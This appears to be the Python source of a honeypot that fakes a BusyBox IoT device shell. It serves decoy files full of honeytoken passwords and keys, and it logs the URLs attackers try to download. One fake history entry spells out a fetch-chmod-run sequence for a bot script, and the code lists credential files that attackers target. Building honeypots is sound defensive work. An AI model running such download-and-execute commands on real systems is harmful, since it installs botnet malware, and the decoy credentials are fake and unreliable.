#!/usr/bin/env python3
"""
Fake Command Handler — SENTINEL Honeypot
Simulates a real BusyBox/Linux IoT device shell with deep responses.
Covers every common attacker command sequence including Mirai, Gafgyt, cryptominers.
"""

import random
import time
import os

# ─── Fake filesystem ────────────────────────────────────────────────────────────
FAKE_FS = {
    "/": ["bin", "dev", "etc", "home", "lib", "mnt", "proc", "root", "sbin", "sys", "tmp", "usr", "var", "backup", "data"],
    "/bin": ["ash", "busybox", "cat", "chmod", "cp", "date", "df", "echo", "grep", "kill", "ls", "mkdir", "mount", "mv", "ping", "ps", "rm", "sh", "sleep", "tar", "touch", "wget"],
    "/etc": ["config", "crontab", "dvr.conf", "group", "hosts", "init.d", "inittab", "mtab", "passwd", "profile", "rc.d", "resolv.conf", "shadow", "ssh", "syslog.conf"],
    "/etc/ssh": ["sshd_config", "ssh_host_ecdsa_key", "ssh_host_rsa_key"],
    "/home": ["admin", "user"],
    "/home/admin": [".bash_history", ".bashrc", ".profile", "notes.txt"],
    "/mnt": ["flash", "mtd", "nand"],
    "/mnt/mtd": ["Config", "Firmware", "Log"],
    "/mnt/mtd/Config": ["account.ini", "network.ini", "system.ini"],
    "/proc": ["cpuinfo", "meminfo", "mounts", "net", "sys", "version"],
    "/root": [".bash_history", ".bashrc", ".profile", ".ssh", "passwords.txt", ".env"],
    "/root/.ssh": ["authorized_keys", "id_rsa", "id_rsa.pub", "known_hosts"],
    "/tmp": [],
    "/var": ["log", "run", "tmp", "www"],
    "/var/log": ["auth.log", "messages", "syslog", "dvr.log"],
    "/var/www": ["cgi-bin", "html", ".env", "config.php"],
    "/var/www/html": ["index.html", "admin", "upload.php"],
    "/backup": ["db.sql", "passwords.txt", "site.tar.gz", "admin_backup.zip"],
    "/data": ["config.json", "users.db", "recordings"],
}

# File contents — what `cat` returns on each path
FILE_CONTENTS = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/bin/false\ndaemon:x:2:2:daemon:/usr/sbin:/bin/false\nadmin:x:500:500:Administrator:/home/admin:/bin/ash\nnobody:x:65534:65534:nobody:/nonexistent:/bin/false\n",
    "/etc/shadow": "root:$6$salt$Wh5p4Q0/Kv.RN2sHrk7Cx5fX5QY3hjNJ0GZrp3nNpV1XkBb/3yInV3eTzTLi5g.:18950:0:99999:7:::\nadmin:$6$salt$AbCdEfGhIj/KlMnOpQrStUvWxYz0123456789abc.:18950:0:99999:7:::\n",
    "/etc/hosts": "127.0.0.1\tlocalhost\n::1\t\tlocalhost ip6-localhost\n192.168.1.1\tgateway router.local\n192.168.1.108\tcamera01.local\n",
    "/etc/dvr.conf": "[System]\nDeviceName=DVR-44EB8C\nLanguage=English\nVideoStandard=NTSC\nMaxConnections=20\n\n[Network]\nIPMode=Static\nIP=192.168.1.108\nSubnet=255.255.255.0\nGateway=192.168.1.1\nDNS1=8.8.8.8\n\n[Account]\nUsername=admin\nPassword=admin123\nEnable=1\n",
    "/mnt/mtd/Config/account.ini": "[User1]\nusername=admin\npassword=admin\ngroup=0\n[User2]\nusername=guest\npassword=guest\ngroup=1\n",
    "/root/passwords.txt": "== Device Admin Credentials ==\nrouter: admin/admin\ncamera: admin/12345\ndvr: admin/888888\nbackup server: backup/Backup2024!\ndatabase: dbuser/MyDB_P@ssw0rd\n",
    "/root/.env": "APP_ENV=production\nDB_HOST=192.168.1.50\nDB_USER=admin\nDB_PASS=SuperSecret2024!\nAPI_KEY=sk-proj-abc123xyz789def\nJWT_SECRET=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\nAWS_KEY=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
    "/home/admin/.bash_history": "mysql -u root -p\nwget http://backup.local/data.sql\nsudo su\ncat /etc/passwd\ncd /backup\nls -la\ntar xzf site.tar.gz\n./install.sh\ncrontab -e\n",
    "/proc/cpuinfo": "Processor\t: ARM926EJ-S rev 5 (v5l)\nBogoMIPS\t: 218.72\nFeatures\t: swp half thumb fastmult edsp java\nCPU implementer\t: 0x41\nCPU architecture: 5TEJ\nCPU variant\t: 0x0\nCPU part\t: 0x926\nCPU revision\t: 5\nHardware\t: HI3518E_DEMO\nRevision\t: 0000\n",
    "/proc/meminfo": "MemTotal:          61440 kB\nMemFree:            3220 kB\nBuffers:            1024 kB\nCached:            12345 kB\nSwapTotal:             0 kB\nSwapFree:              0 kB\n",
    "/proc/version": "Linux version 3.10.14 (gcc version 4.9.4 20150629 (prerelease) (Hisilicon_v600_20161020 4.9.4 20150629)) #1 SMP PREEMPT Mon Sep 18 16:26:25 CST 2017\n",
    "/proc/mounts": "rootfs / rootfs rw 0 0\n/dev/root / squashfs ro,relatime 0 0\nproc /proc proc rw,relatime 0 0\ntmpfs /tmp tmpfs rw,relatime 0 0\n/dev/mtdblock3 /mnt/mtd jffs2 rw,relatime 0 0\n",
    "/backup/passwords.txt": "== Backup Passwords ==\nadmin:Admin@2024\nroot:ProductionKey999\ndbuser:MyDB_P@ssw0rd\nbackup:Backup2024!\n",
    "/var/www/.env": "APP_ENV=production\nDB_HOST=127.0.0.1\nDB_NAME=webapp\nDB_USER=webapp\nDB_PASS=webapp_secret_2024\n",
    "/var/log/syslog": "Feb 18 10:23:01 camera01 syslogd: restart\nFeb 18 10:23:02 camera01 kernel: NET: Registered protocol family 1\nFeb 18 10:23:05 camera01 telnetd[45]: session opened for user root\nFeb 18 10:45:11 camera01 sshd[102]: Failed password for admin from 45.33.32.156 port 56789 ssh2\n",
}

PROMPT_VARIANTS = [
    "root@(none):/# ",
    "root@dvr:~# ",
    "[root@camera ~]# ",
    "/ # ",
    "# ",
    "root@router:/# ",
    "root@NVR:~# ",
]

class FakeShell:
    """Full fake BusyBox shell for Telnet/SSH sessions."""

    def __init__(self, ip="unknown"):
        self.ip = ip
        self.cwd = "/"
        self.prompt = random.choice(PROMPT_VARIANTS)
        self.env = {
            "HOME": "/root",
            "PATH": "/bin:/sbin:/usr/bin:/usr/sbin",
            "USER": "root",
            "SHELL": "/bin/ash",
            "TERM": "vt100",
            "PS1": self.prompt,
        }
        self._download_log = []

    # ─── Public API ─────────────────────────────────────────────────────────────

    def execute(self, raw_command: str) -> str:
        """Execute a shell command and return output string."""
        raw = (raw_command or "").strip()
        if not raw:
            return ""

        # Handle pipes / semicolons — just run each part sequentially
        if ";" in raw:
            parts = raw.split(";")
            return "\n".join(self.execute(p.strip()) for p in parts if p.strip())

        # Handle simple redirections (ignore, just run the command)
        cleaned = raw.split(">")[0].strip() if ">" in raw else raw

        parts = cleaned.split()
        if not parts:
            return ""

        cmd = parts[0].lower()
        args = parts[1:]

        # Dispatch
        handler = getattr(self, f"_cmd_{cmd.replace('-', '_').replace('/', '_')}", None)
        if handler:
            return handler(args)

        # Busybox prefix: "busybox ls" etc
        if cmd == "busybox" and args:
            sub = args[0].lower()
            sub_handler = getattr(self, f"_cmd_{sub}", None)
            if sub_handler:
                return sub_handler(args[1:])
            return self._busybox_info()

        # wget / curl (check by prefix)
        if cmd in ("wget", "curl", "tftp"):
            return self._cmd_wget(args, tool=cmd)

        # chmod, rm, mkdir etc — silent success
        if cmd in ("chmod", "touch", "mkdir", "sync", "reboot", "halt", "kill", "killall",
                   "export", "source", ".", "eval", "exec", "nohup", "setsid"):
            return self._silent_success(cmd, args)

        # Shell built-ins
        if cmd in ("exit", "logout", "quit"):
            return ""

        if cmd == "cd":
            return self._cmd_cd(args)

        return f"{cmd}: command not found\n"

    # ─── Commands ────────────────────────────────────────────────────────────────

    def _cmd_ls(self, args):
        path = args[-1] if args and not args[-1].startswith("-") else self.cwd
        if path.startswith("-"):
            path = self.cwd
        # normalise
        if not path.startswith("/"):
            path = os.path.normpath(self.cwd + "/" + path)

        contents = FAKE_FS.get(path)
        if contents is None:
            return f"ls: {path}: No such file or directory\n"

        long_fmt = "-l" in args or "-la" in args or "-al" in args
        show_hidden = "-a" in args or "-la" in args or "-al" in args

        files = contents[:]
        if show_hidden:
            files = [".", ".."] + files

        if long_fmt:
            lines = ["total " + str(len(files) * 4)]
            for f in files:
                hidden = f.startswith(".")
                is_dir = (path.rstrip("/") + "/" + f) in FAKE_FS or f in (".", "..")
                perm = "drwxr-xr-x" if is_dir else "-rw-r--r--"
                if hidden:
                    perm = perm[:1] + "rw-------" if not is_dir else "drwx------"
                size = random.randint(512, 8192)
                lines.append(f"{perm}  1 root  root  {size:>8}  Feb 18 09:12  {f}")
            return "\n".join(lines) + "\n"
        else:
            return "  ".join(files) + "\n"

    def _cmd_cd(self, args):
        if not args or args[0] in ("~", "/root"):
            self.cwd = "/root"
            return ""
        target = args[0]
        if target == "..":
            self.cwd = os.path.dirname(self.cwd.rstrip("/")) or "/"
            return ""
        if target.startswith("/"):
            new_path = os.path.normpath(target)
        else:
            new_path = os.path.normpath(self.cwd + "/" + target)

        if new_path in FAKE_FS:
            self.cwd = new_path
            return ""
        return f"cd: {target}: No such file or directory\n"

    def _cmd_pwd(self, args):
        return self.cwd + "\n"

    def _cmd_cat(self, args):
        if not args:
            return "cat: missing operand\n"
        path = args[0]
        if not path.startswith("/"):
            path = os.path.normpath(self.cwd + "/" + path)
        if path in FILE_CONTENTS:
            return FILE_CONTENTS[path]
        # honeytoken files
        if "password" in path.lower() or "passwd" in path.lower():
            return FILE_CONTENTS["/etc/passwd"]
        if "shadow" in path.lower():
            return "Permission denied\n"
        if ".env" in path.lower() or "config" in path.lower():
            return FILE_CONTENTS["/root/.env"]
        if path in FAKE_FS:
            return ""  # it's a directory
        return f"cat: {args[0]}: No such file or directory\n"

    def _cmd_echo(self, args):
        return " ".join(args) + "\n"

    def _cmd_uname(self, args):
        if "-a" in args:
            return "Linux dvr 3.10.14 #1 SMP PREEMPT Sat Sep 16 18:28:44 CST 2017 armv7l GNU/Linux\n"
        if "-r" in args:
            return "3.10.14\n"
        if "-m" in args:
            return "armv7l\n"
        return "Linux\n"

    def _cmd_whoami(self, args):
        return "root\n"

    def _cmd_id(self, args):
        return "uid=0(root) gid=0(root) groups=0(root),10(wheel)\n"

    def _cmd_hostname(self, args):
        return "dvr\n"

    def _cmd_ps(self, args):
        return (
            "  PID USER       VSZ STAT COMMAND\n"
            "    1 root      1200 S    init\n"
            "    2 root         0 SW   [kthreadd]\n"
            "   12 root      1104 S    /sbin/syslogd -n\n"
            "   23 root      1108 S    /sbin/klogd -n\n"
            "   45 root      1192 S    /usr/sbin/telnetd -l /bin/ash\n"
            "   67 root      2048 S    /usr/sbin/httpd -f\n"
            "   89 root      1856 S    /usr/sbin/rtspd\n"
            "  123 root      1108 R    ps\n"
        )

    def _cmd_ifconfig(self, args):
        return (
            "eth0      Link encap:Ethernet  HWaddr 44:19:B6:7A:2C:D9\n"
            "          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0\n"
            "          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n"
            "          RX packets:38291 errors:0 dropped:0 overruns:0 frame:0\n"
            "          TX packets:22145 errors:0 dropped:0 overruns:0 carrier:0\n"
            "          inet6 addr: fe80::4619:b6ff:fe7a:2cd9/64 Scope:Link\n\n"
            "lo        Link encap:Local Loopback\n"
            "          inet addr:127.0.0.1  Mask:255.0.0.0\n"
            "          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n"
        )

    def _cmd_ip(self, args):
        if args and args[0] in ("addr", "a"):
            return (
                "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n"
                "    inet 127.0.0.1/8 scope host lo\n"
                "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n"
                "    link/ether 44:19:b6:7a:2c:d9 brd ff:ff:ff:ff:ff:ff\n"
                "    inet 192.168.1.108/24 brd 192.168.1.255 scope global eth0\n"
            )
        return ""

    def _cmd_netstat(self, args):
        return (
            "Active Internet connections (servers and established)\n"
            "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
            "tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN\n"
            "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n"
            "tcp        0      0 0.0.0.0:554             0.0.0.0:*               LISTEN\n"
            "tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN\n"
            "tcp        0      0 192.168.1.108:23        192.168.1.50:54321      ESTABLISHED\n"
        )

    def _cmd_free(self, args):
        return (
            "             total       used       free     shared    buffers     cached\n"
            "Mem:         61440      58220       3220          0       1024      12345\n"
            "-/+ buffers/cache:      44851      16589\n"
            "Swap:            0          0          0\n"
        )

    def _cmd_df(self, args):
        return (
            "Filesystem           1K-blocks      Used Available Use% Mounted on\n"
            "/dev/root                30720     28456      2264  93% /\n"
            "tmpfs                    30720       124     30596   0% /tmp\n"
            "/dev/mtdblock3           10240      8192      2048  80% /mnt/mtd\n"
        )

    def _cmd_uptime(self, args):
        days = random.randint(5, 60)
        h = random.randint(0, 23)
        m = random.randint(0, 59)
        return f" 12:34:56 up {days} days,  {h}:{m:02d},  load average: 0.08, 0.12, 0.09\n"

    def _cmd_date(self, args):
        return time.strftime("Wed Feb 18 12:34:56 UTC 2026\n")

    def _cmd_find(self, args):
        # Common attacker pattern: find / -name "*.conf" etc
        results = ["/etc/dvr.conf", "/mnt/mtd/Config/system.ini", "/var/www/.env", "/root/.env", "/backup/passwords.txt"]
        return "\n".join(results) + "\n"

    def _cmd_grep(self, args):
        if len(args) >= 2 and "passwd" in args:
            return "root:x:0:0:root:/root:/bin/ash\nadmin:x:500:500:Admin:/home/admin:/bin/ash\n"
        return ""

    def _cmd_env(self, args):
        return "\n".join(f"{k}={v}" for k, v in self.env.items()) + "\n"

    def _cmd_printenv(self, args):
        return self._cmd_env(args)

    def _cmd_history(self, args):
        return (
            "    1  ls\n"
            "    2  cat /etc/passwd\n"
            "    3  cd /root\n"
            "    4  cat passwords.txt\n"
            "    5  wget http://example.com/bot.sh\n"
            "    6  chmod +x bot.sh\n"
            "    7  ./bot.sh\n"
        )

    def _cmd_busybox(self, args):
        return self._busybox_info()

    def _busybox_info(self):
        return (
            "BusyBox v1.28.4 (2019-12-16 16:23:45 UTC) multi-call binary.\n"
            "Usage: busybox [function [arguments]...]\n\n"
            "Currently defined functions:\n"
            "  [, [[, ash, awk, cat, chmod, cp, date, df, echo, env, find, grep,\n"
            "  hostname, id, ifconfig, kill, ls, mkdir, mount, mv, netstat, ping,\n"
            "  ps, rm, sed, sh, sleep, sync, tar, touch, uname, uptime, vi, wget, which\n"
        )

    def _cmd_wget(self, args, tool="wget"):
        """Fake download — logs the URL, returns realistic output."""
        url = next((a for a in args if "://" in a), None)
        if not url and args:
            url = args[-1]
        if not url:
            url = "http://unknown/bot"

        filename = url.split("/")[-1] or "index.html"
        self._download_log.append(url)

        if tool == "curl":
            if "-s" in args or "--silent" in args:
                return ""
            return f"  % Total    % Received % Xferd  Average Speed   Time\n100   1247  100  1247    0     0   8931      0 --:--:-- --:--:-- --:--:--  8931\n"

        return (
            f"--2026-02-18 12:34:56--  {url}\n"
            f"Resolving {url.split('/')[2]}... 198.51.100.7\n"
            f"Connecting to {url.split('/')[2]}:80... connected.\n"
            f"HTTP request sent, awaiting response... 200 OK\n"
            f"Length: 1247 (1.2K) [application/octet-stream]\n"
            f"Saving to: '{filename}'\n\n"
            f"{filename}              100%[===================>]   1.22K  --.-KB/s    in 0s\n\n"
            f"2026-02-18 12:34:56 (45.2 MB/s) - '{filename}' saved [1247/1247]\n"
        )

    def _cmd_tftp(self, args):
        return f"tftp: saved {args[-1] if args else 'file'}\n"

    def _cmd_chmod(self, args):
        return ""

    def _cmd_rm(self, args):
        return ""

    def _cmd_mkdir(self, args):
        return ""

    def _cmd_cp(self, args):
        return ""

    def _cmd_mv(self, args):
        return ""

    def _cmd_ping(self, args):
        host = args[0] if args else "127.0.0.1"
        return (
            f"PING {host} ({host}): 56 data bytes\n"
            f"64 bytes from {host}: seq=0 ttl=64 time=0.412 ms\n"
            f"64 bytes from {host}: seq=1 ttl=64 time=0.398 ms\n"
            f"64 bytes from {host}: seq=2 ttl=64 time=0.405 ms\n\n"
            f"--- {host} ping statistics ---\n"
            f"3 packets transmitted, 3 received, 0% packet loss\n"
        )

    def _cmd_tar(self, args):
        return ""

    def _cmd_sh(self, args):
        return ""

    def _cmd_sleep(self, args):
        return ""

    def _silent_success(self, cmd, args):
        return ""

    def get_downloaded_urls(self):
        return list(self._download_log)


# Singleton for backward compat with newHoneypot.py
class FakeCommandHandler:
    def __init__(self):
        self._shells = {}

    def get_shell(self, session_id="default"):
        if session_id not in self._shells:
            self._shells[session_id] = FakeShell()
        return self._shells[session_id]

    def execute(self, command, session_id="default"):
        return self.get_shell(session_id).execute(command)


FAKE_CMD_HANDLER = FakeCommandHandler()
